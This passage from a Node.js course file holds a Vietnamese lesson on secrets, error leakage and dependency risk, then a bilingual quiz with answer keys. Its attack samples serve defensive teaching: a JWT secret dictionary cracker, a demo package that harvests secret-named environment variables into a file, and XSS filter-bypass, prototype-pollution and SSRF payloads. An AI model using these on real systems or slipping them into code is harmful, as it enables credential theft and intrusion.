<h3>Phép đo 1 — bí mật JWT yếu không phải là "yếu hơn một chút"</h3>
<p>Chương 8 dựng toàn bộ hệ xác thực trên <code>JWT_SECRET</code>. Đây là chuyện xảy ra nếu giá trị đó là một từ tiếng Anh. Kẻ tấn công chỉ có đúng một thứ: một token, thứ mà bất kỳ người dùng đã đăng nhập nào cũng đọc được từ trình duyệt của chính mình.</p>
<pre><code><span class="tok-kw">const</span> WEAK = [<span class="tok-str">'secret'</span>, <span class="tok-str">'password'</span>, <span class="tok-str">'123456'</span>, <span class="tok-str">'changeme'</span>, <span class="tok-str">'jwt_secret'</span>,
             <span class="tok-str">'supersecret'</span>, <span class="tok-str">'mysecretkey'</span>, <span class="tok-str">'secretkey'</span>, <span class="tok-str">'nodejs'</span>, <span class="tok-str">'admin123'</span>];
<span class="tok-kw">for</span> (<span class="tok-kw">const</span> w <span class="tok-kw">of</span> WEAK) { <span class="tok-kw">try</span> { jwt.verify(token, w); found = w; <span class="tok-kw">break</span> } <span class="tok-kw">catch</span> {} }</code></pre>
<div class="out">từ điển 10 từ → tìm thấy "supersecret" trong 1.04ms
tốc độ thử: 35.465 bí mật/giây trên MỘT nhân
vét cạn 8 ký tự thường (26^8)        = 68,2 ngày
vét cạn 8 ký tự chữ+số (36^8)        = 2,5 năm
vét cạn 32 byte ngẫu nhiên (2^256)   = 1,0e+65 năm
crypto.randomBytes(32).toString('base64url') = xUMtHMbnIi6NDoiYUqHLnNsgPLpRnGpdcZp0KD1qk6g</div>
<p>Một phần nghìn giây. Và khi đã biết bí mật, kẻ tấn công không đi ăn cắp phiên — họ <em>tự phát hành</em> token: id người dùng nào cũng được, vai trò nào cũng được, hạn nào cũng được, ký đúng chuẩn. Mọi lớp phòng thủ của chương 8 (xoay vòng, thu hồi, chặn tần suất) bị vô hiệu, vì dưới góc nhìn của máy chủ những token đó là thật.</p>
<p>Cũng để ý dòng thứ ba: một mật khẩu tám ký tự chữ và số, kiểu do con người nghĩ ra, gục sau 2,5 năm trên MỘT nhân — nghĩa là vài ngày trên GPU thuê. Dòng cuối mới là dòng duy nhất chấp nhận được: <strong>32 byte từ bộ sinh ngẫu nhiên mật mã, do máy sinh ra, không bao giờ do người gõ.</strong></p>
<div class="callout"><p>Luật đó áp dụng cho mọi bí mật cùng hình dạng: khoá phiên, khoá ký webhook, token giữa các dịch vụ nội bộ, khoá kích hoạt cron. Nếu con người nhớ được nó thì nó quá ngắn.</p></div>

<h3>Phép đo 2 — so sánh chuỗi bí mật</h3>
<p>Khi bạn kiểm một API key, <code>a === b</code> trả về ngay khi gặp byte đầu tiên khác nhau. Vậy nên thời gian nó chạy phụ thuộc vào số byte đầu ĐÚNG, và đó là thông tin kẻ tấn công đo được rồi dùng để dựng dần cái khoá từng byte một. Node có sẵn bản sửa:</p>
<pre><code><span class="tok-kw">const</span> cmpSafe = (a, b) =&gt; {
  <span class="tok-kw">const</span> x = Buffer.from(a), y = Buffer.from(b);
  <span class="tok-kw">return</span> x.length === y.length &amp;&amp; crypto.timingSafeEqual(x, y);
};</code></pre>
<div class="out">timingSafeEqual độ dài khác nhau → ném ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH
cmpSafe("abc","abcd") = false | cmpSafe đúng key = true | cmpNaive = true</div>
<p>Hai lưu ý thực dụng. <code>timingSafeEqual</code> <strong>NÉM LỖI</strong> khi hai độ dài khác nhau chứ không trả về false, nên luôn tự kiểm độ dài trước — như hàm bọc ở trên. Và trên thực tế bạn hiếm khi cần tới nó: so sánh <em>bản băm</em> của khoá (đúng khuôn mẫu chương 8 dùng cho refresh token) vừa an toàn về thời gian ngay từ thiết kế, vừa an toàn hơn nếu cơ sở dữ liệu bị lộ.</p>

<h3>Phép đo 3 — thông báo lỗi của bạn khai gì với kẻ tấn công</h3>
<p>Lỗ rò thông tin phổ biến nhất trong một backend Node là một dòng code đầy thiện chí: <code>res.status(500).json({ error: err.message })</code>.</p>
<div class="out">trả nguyên err: {"error":"ENOENT: no such file or directory,
                          open '/opt/cuongthai/.env.production'",
                 "stack":["Error: ENOENT: …","    at Object.openSync (node:fs:561:18)"]}
nên trả     : {"error":"INTERNAL","requestId":"90779998-0e6f-4c9d-9538-bd4b59980836"}</div>
<p>Phản hồi đầu khai ra đường dẫn triển khai, khai rằng có tồn tại một file <code>.env.production</code>, và khai luôn phiên bản Node qua chi tiết các khung stack. Lỗi cơ sở dữ liệu còn tệ hơn: một lỗi kết nối in ra host, cổng và tên người dùng; một lỗi Prisma <code>P2002</code> in ra tên ràng buộc và tên cột, tức là lược đồ của bạn.</p>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-t">Ghi log đầy đủ</span><span class="lz-d">message, stack, request id, user id — vào log của bạn, nơi chỉ bạn đọc</span></div>
  <div class="lz-step"><span class="lz-t">Trả ra gần như không gì</span><span class="lz-d">một mã lỗi ổn định và chính cái request id đó — đủ để người dùng dán vào phiếu hỗ trợ</span></div>
  <div class="lz-step"><span class="lz-t">Phân biệt 4xx với 5xx</span><span class="lz-d">lỗi kiểm dữ liệu thì <em>nên</em> cụ thể (bài 6.3); lỗi nội bộ thì không</span></div>
</div>
<p>Chính cái request id làm cho cách này chạy được: người dùng gửi bạn tám ký tự, bạn tìm ra nguyên cái stack trong log. Production của dự án này đặt nó thành header <code>X-Request-ID</code> trên mọi phản hồi — bạn nhìn thấy nó bằng <code>curl -sI https://cuongthai.com/api/v1/courses</code>.</p>

<h3>Phép đo 4 — bạn đang chạy bao nhiêu code không do mình viết</h3>
<p>Sandbox của chương 8 — một app Express + Prisma + auth nhỏ với <strong>chín</strong> dependency trực tiếp:</p>
<div class="out">$ node -e "console.log(Object.keys(require('./package.json').dependencies).length)"
9
$ find node_modules -maxdepth 2 -name package.json | wc -l
183</div>
<p>Chín gói bạn chọn, 183 gói bạn chạy. Mỗi gói trong đó thực thi với TOÀN BỘ quyền của tiến trình bạn: <code>process.env</code>, hệ thống file, mạng. Đây là một gói "tiện ích" làm đúng chuyện đó — dòng trên cùng là hàm thật, phần còn lại là payload:</p>
<pre><code>module.exports = (s, n) =&gt; String(s).padStart(n, <span class="tok-str">' '</span>);

<span class="tok-kw">const</span> loot = Object.entries(process.env)
  .filter(([k]) =&gt; /SECRET|KEY|TOKEN|PASSWORD|DATABASE/i.test(k));
require(<span class="tok-str">'fs'</span>).writeFileSync(<span class="tok-str">'/tmp/ch9-loot.json'</span>, JSON.stringify(loot));</code></pre>
<div class="out">$ DATABASE_URL=… JWT_SECRET=… R2_SECRET_ACCESS_KEY=… node app.js
[left-pad-vn] đã gửi 3 biến môi trường đi nơi khác
kết quả bình thường: "   7"
file kẻ tấn công ghi ra: [["DATABASE_URL","postgres://prod:sieu-mat@db:5432/app"],
                          ["JWT_SECRET","kh0ng-ai-doan-duoc"],
                          ["R2_SECRET_ACCESS_KEY","wJalrXUtnFEMI"]]</div>
<p>Hàm vẫn trả về đúng kết quả. Test vẫn xanh. Trong một vụ thật, lệnh ghi file được thay bằng một request ra mạng, và dấu vết duy nhất là một kết nối đi ra mà không ai theo dõi. Chương 4 đã đo phiên bản lúc CÀI ĐẶT của chuyện này (<code>postinstall</code> ghi file vào thư mục HOME trước khi bạn import bất cứ thứ gì); đây là phiên bản lúc CHẠY, và <code>--ignore-scripts</code> không giúp được gì.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Ít phụ thuộc hơn</span><span class="v">Biện pháp mạnh nhất, bỏ xa các biện pháp khác. "Cái này có đáng thêm 40 gói không?" là một câu hỏi bảo mật, không phải câu hỏi thẩm mỹ.</span></div>
  <div class="kv"><span class="k">Lockfile + <code>npm ci</code></span><span class="v">Bạn đã soát một cây phụ thuộc cụ thể; hãy cài đúng <em>cây đó</em> (bài 4.2). Một khoảng caret nghĩa là bản build ngày mai chạy code chưa ai xem qua.</span></div>
  <div class="kv"><span class="k">Đọc diff khi nâng cấp</span><span class="v">Không cần từng dòng — nhưng một gói bỗng dưng mọc thêm code mạng hay thêm một phụ thuộc bắc cầu mới thì đáng ba mươi giây chú ý.</span></div>
  <div class="kv"><span class="k">Quyền tối thiểu lúc chạy</span><span class="v">Container chỉ nên giữ đúng những biến môi trường mà tiến trình đó cần. Một backend không bao giờ đụng tới R2 thì không nên có <code>R2_SECRET_ACCESS_KEY</code> trong môi trường của nó.</span></div>
</div>

<h3>Bí mật thật ra nên nằm ở đâu</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Trong code / trong git</span><span class="lz-lnote">KHÔNG BAO GIỜ. Và khi lỡ xảy ra: hãy XOAY bí mật đó. Xoá dòng code không cứu được gì — lịch sử git và mọi bản clone vẫn còn nó</span></div>
  <div class="lz-layer"><span class="lz-lname">Trong image Docker</span><span class="lz-lnote">Không. Ai kéo được image thì đọc được layer; giá trị <code>ARG</code> còn nằm trong lịch sử build</span></div>
  <div class="lz-layer"><span class="lz-lname">Trong môi trường lúc chạy</span><span class="lz-lnote">Đúng — nạp vào khi container khởi động, từ một file mà lệnh deploy không bao giờ ghi đè</span></div>
  <div class="lz-layer"><span class="lz-lname">Trong một trình quản lý bí mật</span><span class="lz-lnote">Tốt hơn nữa: xoay vòng, nhật ký truy cập, phân quyền theo từng dịch vụ. Là bước tiếp theo sau một con VPS đơn lẻ</span></div>
</div>
<div class="pitfall">
<p><strong>Biến của frontend không phải là bí mật.</strong> Trong Next.js, mọi biến tên <code>NEXT_PUBLIC_*</code> được nhúng thẳng vào bundle JavaScript lúc <em>build</em> — nó đi tới mọi khách truy cập và khởi động lại bao nhiêu lần cũng không đổi. Một khoá API của bên thứ ba đặt ở đó là công khai ngay khi bạn deploy. Đây không phải lý thuyết ở dự án này: trình chọn GIF từng gọi thẳng GIPHY từ trình duyệt bằng <code>NEXT_PUBLIC_GIPHY_API_KEY</code>, và đó chính xác là lý do hôm nay có <code>/api/v1/gifs</code> làm proxy phía máy chủ. Luật: mọi API bên thứ ba mà trình duyệt cần đều phải đi qua một route backend, khoá đọc từ biến môi trường lúc chạy.</p>
</div>

<div class="note-ct">
<p><strong>cuongthai.com giữ bí mật thế nào.</strong> Biến môi trường lúc chạy của production nằm ở <code>/opt/cuongthai/.env</code> trên VPS; <code>deploy.sh</code> nạp nó ở mỗi lần deploy còn bước rsync thì <strong>loại trừ</strong> <code>.env*</code>, nên giá trị đặt ở đó sống sót qua mọi lần deploy và không bao giờ phải đi từ máy cá nhân lên. Không có gì bí mật bị nướng vào image. Repo có một hook <code>gitleaks</code> chạy trước mỗi commit, từ chối mọi commit chứa thứ gì có hình dạng của một cái khoá — kể cả, ở một thời điểm, một refresh token sinh ngẫu nhiên được in ra làm ví dụ trong <em>chính khoá học này</em>; cách sửa là một danh sách miễn trừ tường minh trong <code>.gitleaks.toml</code> cho <code>content/courses/</code> và <code>content/exphub/</code>, chỉ giới hạn ở đúng luật <code>generic-api-key</code>, và được kiểm chứng bằng cách thử đặt một khoá RSA thật vào cùng thư mục để chắc chắn nó VẪN bị bắt. Đó là hình dạng đúng của một ngoại lệ bảo mật: hẹp hết mức có thể, và được kiểm cả hai chiều.</p>
</div>

<h3>Danh sách kiểm ngắn trước khi lên production</h3>
<div class="lz-map">
  <div class="lz-node"><span class="lz-t">helmet + CSP</span><span class="lz-d">bật header, mỗi header một chủ sở hữu (9.1)</span></div>
  <div class="lz-node"><span class="lz-t">Danh sách trắng CORS</span><span class="lz-d">origin tường minh, không bao giờ <code>origin: true</code> kèm credentials (9.1)</span></div>
  <div class="lz-node"><span class="lz-t">Sanitize lúc render</span><span class="lz-d">mọi <code>dangerouslySetInnerHTML</code> đi qua đúng một hàm (9.2)</span></div>
  <div class="lz-node"><span class="lz-t">Kiểm trước khi dùng</span><span class="lz-d">schema zod, chặn độ dài, chặn số phần tử, chặn kích thước thân request (9.3)</span></div>
  <div class="lz-node"><span class="lz-t">Không nhận URL từ người dùng</span><span class="lz-d">hoặc danh sách trắng + tự đi theo chuyển hướng (9.3)</span></div>
  <div class="lz-node"><span class="lz-t">Bí mật 32 byte</span><span class="lz-d">từ bộ sinh ngẫu nhiên mật mã, ở env lúc chạy, xoay được (9.4)</span></div>
  <div class="lz-node"><span class="lz-t">5xx mờ đục</span><span class="lz-d">trả mã lỗi + request id, đẩy nguyên stack vào log (9.4)</span></div>
  <div class="lz-node"><span class="lz-t">npm ci trong CI</span><span class="lz-d">cây phụ thuộc bạn đã soát chính là cây bạn ship (4.2)</span></div>
</div>
<p>Không thứ nào trong danh sách đó khó. Tất cả đều thuộc loại việc chỉ xảy ra nếu có người chép nó ra giấy — và đó mới là mục đích thật của chương này.</p>

<a class="link-card codelab" href="/code-lab/nodejs-express${REF}#module-323" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 323 — Authentication, Authorization, and Security</span><span class="lc-sub">10 bài tập: quản lý bí mật, so sánh an toàn, và xử lý lỗi không rò rỉ.</span></span>
</a>
<a class="link-card codelab" href="/code-lab/deploy-vps${REF}#module-1005" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 1005 — Securing the Server (users, firewall, keys)</span><span class="lc-sub">10 bài tập: khoá SSH, tường lửa, và quyền tối thiểu trên VPS.</span></span>
</a>
</div>
`,
    },
    /* ─────────────────────────── 9.5 ─────────────────────────── */
    {
      title: '9.5 — Chapter 9 quiz|||9.5 — Kiểm tra chương 9',
      slug: 'nodejs-9-5-quiz',
      type: 'QUIZ',
      description: 'Chín câu về header và CORS, XSS lưu trữ và sanitize, ReDoS, ô nhiễm nguyên mẫu, SSRF, bí mật và phụ thuộc.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 9 · Quiz</span>
<h2>Check what stuck</h2>
<p class="lead">Every question below is settled by an output block in lessons 9.1 to 9.4 — a measured number or a real HTTP response, not an opinion. Security is the area where plausible reasoning fails most often, so if a question feels like a coin flip, go back to the measurement rather than to the prose around it.</p>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 9 · Kiểm tra</span>
<h2>Xem thử đọng lại được gì</h2>
<p class="lead">Mọi câu dưới đây đều được phân định bởi một khối kết quả trong bài 9.1 tới 9.4 — một con số đo được hoặc một phản hồi HTTP thật, không phải quan điểm. Bảo mật là mảng mà suy luận "nghe có lý" sai nhiều nhất, nên câu nào bạn thấy như tung đồng xu thì hãy quay lại đúng phép đo, đừng quay lại phần văn xuôi quanh nó.</p>
</div>
`,
      quiz: {
        timeLimitSeconds: 720,
        questions: [
          {
            question: 'A server with no CORS configuration received a POST from Origin https://evil.example and answered 200, and the balance went from 1000 to 900. What does this prove?|||Một máy chủ không cấu hình CORS nhận một POST từ Origin https://evil.example, trả về 200, và số dư đi từ 1000 xuống 900. Điều đó chứng minh gì?',
            options: [
              'The CORS middleware was misconfigured and should have blocked the request|||Middleware CORS bị cấu hình sai và lẽ ra phải chặn request đó',
              'CORS is enforced by browsers and controls who may READ a response — the request still arrives and still changes state, so authentication and CSRF defence are what protect the endpoint|||CORS do TRÌNH DUYỆT thi hành và chỉ quyết định ai được ĐỌC phản hồi — request vẫn tới nơi và vẫn đổi trạng thái, nên thứ bảo vệ endpoint là xác thực và lớp chống CSRF',
              'The Origin header was forged, so the browser would have blocked it in real life|||Header Origin bị giả mạo, nên ngoài đời trình duyệt sẽ chặn nó',
              'Express 5 ignores the Origin header on POST requests only|||Express 5 bỏ qua header Origin, nhưng chỉ với request POST',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Your API answers a request from https://evil.example with Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true. Which configuration produced this and why is it dangerous?|||API của bạn trả lời một request từ https://evil.example bằng Access-Control-Allow-Origin: https://evil.example và Access-Control-Allow-Credentials: true. Cấu hình nào sinh ra chuyện đó và vì sao nó nguy hiểm?',
            options: [
              "cors({ origin: '*' }) — the wildcard matches every origin|||cors({ origin: '*' }) — dấu sao khớp mọi origin",
              'cors({ origin: true, credentials: true }) — it reflects whatever origin asked, telling the browser that any site may make authenticated requests to your API and read the answers|||cors({ origin: true, credentials: true }) — nó phản chiếu lại bất kỳ origin nào hỏi, tức là nói với trình duyệt rằng MỌI website đều được gọi API của bạn kèm thông tin đăng nhập và đọc câu trả lời',
              'A missing Vary: Origin header caused a cache to serve the wrong response|||Thiếu header Vary: Origin nên một tầng cache trả nhầm phản hồi',
              'helmet() overrode the CORS allow-list|||helmet() ghi đè lên danh sách trắng của CORS',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'helmet sends x-xss-protection: 0. Should you change it to 1?|||helmet gửi x-xss-protection: 0. Bạn có nên đổi thành 1 không?',
            options: [
              'Yes — 1 enables the browser XSS filter and is strictly safer|||Có — 1 bật bộ lọc XSS của trình duyệt và chắc chắn an toàn hơn',
              'No — that header controlled a legacy browser heuristic that was itself exploitable and has been removed from modern browsers; 0 is the correct modern value|||Không — header đó điều khiển một cơ chế phỏng đoán đời cũ của trình duyệt, bản thân nó từng bị lợi dụng để tấn công và đã bị gỡ khỏi các trình duyệt hiện đại; 0 mới là giá trị đúng của thời nay',
              'It makes no difference; the header is ignored either way|||Không khác gì; header đó bị bỏ qua trong mọi trường hợp',
              'Yes, but only if you also disable CSP|||Có, nhưng chỉ khi bạn đồng thời tắt CSP',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'In the stored-XSS measurement, the run with an httpOnly cookie sent the attacker an empty string, but a second payload calling POST /notes/delete-all still succeeded. What is the correct conclusion about httpOnly?|||Trong phép đo stored XSS, lần chạy có cookie httpOnly gửi cho kẻ tấn công một chuỗi rỗng, nhưng payload thứ hai gọi POST /notes/delete-all thì vẫn thành công. Kết luận đúng về httpOnly là gì?',
            options: [
              'httpOnly prevents XSS, so the second payload must have exploited a different bug|||httpOnly ngăn được XSS, nên payload thứ hai chắc chắn khai thác một lỗi khác',
              'httpOnly reduces the blast radius (the token cannot be read) but the injected script still runs inside the victim session and the browser attaches the cookie automatically — only stopping the payload from reaching the DOM is a fix|||httpOnly làm hẹp bán kính vụ nổ (không đọc được token) nhưng script bị chèn vẫn chạy trong phiên của nạn nhân và trình duyệt vẫn tự gắn cookie vào — chỉ có việc chặn payload chạm tới DOM mới là bản sửa',
              'The second payload worked because the cookie was missing the SameSite attribute|||Payload thứ hai chạy được vì cookie thiếu thuộc tính SameSite',
              'httpOnly only applies to cookies read over HTTP, not HTTPS|||httpOnly chỉ áp dụng cho cookie đọc qua HTTP, không áp dụng cho HTTPS',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Input &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt; passed through a home-made filter that strips &lt;script&gt;…&lt;/script&gt; and the output was &lt;script&gt;. What happened?|||Đầu vào &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt; đi qua một bộ lọc tự chế chuyên xoá &lt;script&gt;…&lt;/script&gt; và kết quả in ra là &lt;script&gt;. Chuyện gì đã xảy ra?',
            options: [
              'The filter worked correctly; the remaining tag is harmless because it is empty|||Bộ lọc chạy đúng; thẻ còn lại vô hại vì nó rỗng',
              'The single-pass replace removed the inner match and joined the two surrounding halves into a working script tag — a filter that constructs the very thing it was written to remove|||Lần replace duy nhất xoá phần khớp bên trong rồi ghép hai nửa còn lại thành một thẻ script chạy được — một bộ lọc tự tạo ra đúng cái nó được viết ra để xoá',
              'The regex was missing the global flag|||Biểu thức chính quy thiếu cờ global',
              'jsdom re-encoded the payload during parsing|||jsdom mã hoá lại payload trong lúc phân tích',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'A 31-character string made /^(a+)+$/ run for 7652ms and delayed a 100ms heartbeat by 7552ms. Why can you not fix this by putting a timeout around the regex?|||Một chuỗi 31 ký tự khiến /^(a+)+$/ chạy 7652ms và làm nhịp tim 100ms trễ 7552ms. Vì sao bạn không thể sửa bằng cách đặt timeout quanh biểu thức chính quy?',
            options: [
              'Timeouts only work on network calls, not on CPU work|||Timeout chỉ hoạt động với lời gọi mạng, không hoạt động với việc tính toán',
              'JavaScript is single-threaded and a running RegExp is synchronous — the timer callback cannot run until the regex finishes, so the only real timeout is running it in a worker thread|||JavaScript đơn luồng và một RegExp đang chạy là code đồng bộ — callback của timer không thể chạy cho tới khi regex xong, nên timeout thật sự duy nhất là chạy nó trong worker thread',
              'The timeout works, but Express swallows the resulting error|||Timeout có tác dụng, nhưng Express nuốt mất lỗi sinh ra',
              'V8 already applies an internal 5-second regex limit|||V8 vốn đã áp một giới hạn 5 giây cho mọi regex',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'After a deep-merge of JSON.parse(\'{"__proto__":{"isAdmin":true}}\'), an unrelated object user = { name: "Bình" } answered true to user.isAdmin. Why is this worse than an ordinary bug?|||Sau khi trộn sâu JSON.parse(\'{"__proto__":{"isAdmin":true}}\'), một object không liên quan user = { name: "Bình" } trả lời true cho user.isAdmin. Vì sao chuyện này tệ hơn một bug thông thường?',
            options: [
              'Because JSON.parse is slower than a manual parser|||Vì JSON.parse chậm hơn một bộ phân tích tự viết',
              'Because the change lands on Object.prototype, so every plain object in the process — for every user, until restart — inherits the property; it is not scoped to the request that caused it|||Vì thay đổi rơi vào Object.prototype, nên MỌI object thường trong tiến trình — với mọi người dùng, cho tới khi khởi động lại — đều thừa kế thuộc tính đó; nó không bị giới hạn trong request đã gây ra',
              'Because Express reparses req.body on every route|||Vì Express phân tích lại req.body ở mỗi route',
              'Because it corrupts the database rows permanently|||Vì nó làm hỏng vĩnh viễn các dòng dữ liệu trong cơ sở dữ liệu',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Your /preview endpoint validates that the URL is https and its hostname is on an allow-list. An attacker supplies an allowed https URL that answers 302 pointing at http://127.0.0.1:4404/admin/config, and the internal config comes back. What is the fix?|||Endpoint /preview của bạn kiểm rằng URL là https và tên miền nằm trong danh sách trắng. Kẻ tấn công đưa một URL https hợp lệ, host đó trả về 302 trỏ tới http://127.0.0.1:4404/admin/config, và cấu hình nội bộ bay về. Cách sửa là gì?',
            options: [
              'Add 127.0.0.1 to a blocklist of hostnames|||Thêm 127.0.0.1 vào danh sách đen tên miền',
              'Follow redirects manually (redirect: "manual") and re-validate every hop, reject private IP ranges after DNS resolution, or better: accept an identifier instead of a URL and build the URL server-side|||Tự đi theo chuyển hướng (redirect: "manual") và kiểm lại ở TỪNG chặng, chặn các dải IP nội bộ sau khi phân giải DNS, hoặc tốt hơn: nhận một mã định danh thay vì URL rồi tự dựng URL ở phía máy chủ',
              'Switch from fetch to axios, which does not follow redirects|||Chuyển từ fetch sang axios vì axios không đi theo chuyển hướng',
              'Put the preview endpoint behind authentication — an authenticated user cannot perform SSRF|||Đặt endpoint preview sau lớp xác thực — người dùng đã đăng nhập thì không thể thực hiện SSRF',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'A ten-word dictionary recovered a JWT secret in 1.04ms, at 35,465 candidate secrets per second on one core. What is the consequence, and what is the right secret?|||Một từ điển mười từ tìm ra bí mật JWT trong 1,04ms, với tốc độ 35.465 ứng viên mỗi giây trên một nhân. Hậu quả là gì và bí mật đúng phải như thế nào?',
            options: [
              'Existing sessions can be replayed; rotating the secret every 24 hours is enough|||Các phiên hiện có bị phát lại; xoay bí mật mỗi 24 giờ là đủ',
              'The attacker can mint valid tokens with any user id, role and expiry — bypassing rotation, revocation and rate limiting — so the secret must be 32 random bytes from a CSPRNG, never a typed word|||Kẻ tấn công có thể TỰ PHÁT HÀNH token hợp lệ với id, vai trò và hạn tuỳ ý — vô hiệu hoá xoay vòng, thu hồi và chặn tần suất — nên bí mật phải là 32 byte ngẫu nhiên từ bộ sinh mật mã, không bao giờ là một từ do người gõ',
              'Only tokens signed before the leak are affected|||Chỉ các token ký trước thời điểm rò rỉ bị ảnh hưởng',
              'Nothing serious, because the payload is still base64url encoded|||Không nghiêm trọng, vì phần payload vẫn được mã hoá base64url',
            ],
            correctIndex: 1,
            points: 1,
          },
        ],
      },
    },
  ],
};
